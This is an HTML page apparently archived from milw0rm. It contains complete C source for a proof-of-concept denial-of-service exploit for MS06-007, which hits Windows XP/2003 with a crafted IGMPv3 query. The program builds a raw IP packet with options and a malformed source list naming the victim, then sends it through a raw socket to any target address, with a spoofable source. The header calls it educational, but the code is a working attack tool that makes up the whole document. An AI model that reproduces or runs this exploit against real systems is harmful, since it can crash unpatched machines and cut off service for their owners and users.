<html><head><title>MS Windows XP/2003 (IGMP v3) Denial of Service Exploit (MS06-007)  (2)</title></head><pre>/* MS06-007 Denial of Service POC exploit
   created by Firestorm, based on zloSend.exe win32 exploit (http://www.securitylab.ru/poc/264136.php)
   Tested on Windows XP SP2 as victim (compiled/runned on Fedore Core 4 x86)
   FOR EDUCATIONAL PURPOSE ONLY !!!      */
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netdb.h&gt;
#include &lt;sys/time.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;arpa/inet.h&gt;
#include &lt;unistd.h&gt;


struct iphdr
{
  unsigned char ihl:4, version:4, tos;
  unsigned short tot_len, id, frag_off;
  unsigned char ttl, protocol;
  unsigned short check;
  unsigned int saddr, daddr;
  unsigned int options1;
  unsigned int options2;
};


struct igmpv3_query {
        unsigned char type;
        unsigned char code;
        unsigned short csum;
        unsigned int group;
        unsigned char qqic;
        unsigned char qrv:3,
        suppress:1,
        resv:4;
        unsigned short nsrcs;
        unsigned int srcs[1];
};


unsigned short in_chksum(unsigned short *, int);
long resolve(char *);


long resolve(char *host)
{
  struct hostent *hst;
  long addr;


  hst = gethostbyname(host);
  if (hst == NULL)
    return(-1);


  memcpy(&amp;addr, hst-&gt;h_addr, hst-&gt;h_length);


  return(addr);
}


int main(int argc, char *argv[])
{
  struct sockaddr_in dst;
  struct iphdr *ip;
  struct igmpv3_query *igmp;
  long daddr, saddr;
  int s, i=0, c, len, one=1;
  char buf[1500];


  if (argc &lt; 3)
  {
    printf(&quot;MS06-007 Denial of Service POC exploit by Firestorm\n&quot;);
    printf(&quot;Usage: %s &lt;src&gt; &lt;dst&gt;\n&quot;, *argv);
    return(1);
  }


  daddr = resolve(argv[2]);
  saddr = resolve(argv[1]);


  memset(buf, 0, 1500);
  ip = (struct iphdr *)&amp;buf;
  igmp = (struct igmpv3_query*)&amp;buf[sizeof(struct iphdr)];


  dst.sin_addr.s_addr = daddr;
  dst.sin_family = AF_INET;


  ip-&gt;ihl = 7;
  ip-&gt;version = 4;
  ip-&gt;tos = 0;
  ip-&gt;tot_len = htons(44);
  ip-&gt;id = htons(18277);
  ip-&gt;frag_off=0;
  ip-&gt;ttl = 128;
  ip-&gt;protocol = IPPROTO_IGMP;
  ip-&gt;check = in_chksum((unsigned short *)ip, sizeof(struct iphdr));
  ip-&gt;saddr = saddr;
  ip-&gt;daddr = daddr;
  ip-&gt;options1 = 0;
  ip-&gt;options2 = 0;
  igmp-&gt;type = 0x11;
  igmp-&gt;code = 5;
  igmp-&gt;group=inet_addr(&quot;224.0.0.1&quot;);
  igmp-&gt;qqic=0;
  igmp-&gt;qrv=0;
  igmp-&gt;suppress=0;
  igmp-&gt;resv=0;
  igmp-&gt;nsrcs=htons(1);
  igmp-&gt;srcs[0]=daddr;

  igmp-&gt;csum = 0; //For computing the checksum, the Checksum field is set to zero.
  igmp-&gt;csum=in_chksum((unsigned short *)igmp, sizeof(struct igmpv3_query));

  s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (s == -1)
    return(1);

  printf(&quot;Sending IGMP packet: %s -&gt; %s\n&quot;, argv[1], argv[2]);

      if (sendto(s,&amp;buf,44,0,(struct sockaddr *)&amp;dst,sizeof(struct sockaddr_in)) == -1)
      {
        perror(&quot;Error sending packet&quot;);
        exit(-1);
      }

  return(0);
}


unsigned short in_chksum(unsigned short *addr, int len)
{
   register int nleft = len;
   register int sum = 0;
   u_short answer = 0;

   while (nleft &gt; 1) {
      sum += *addr++;
      nleft -= 2;
   }


   if (nleft == 1) {
      *(u_char *)(&amp;answer) = *(u_char *)addr;
      sum += answer;
   }


   sum = (sum &gt;&gt; 16) + (sum &amp; 0xffff);
   sum += (sum &gt;&gt; 16);
   answer = ~sum;
   return(answer);
}

// milw0rm.com [2006-03-22]</pre></html>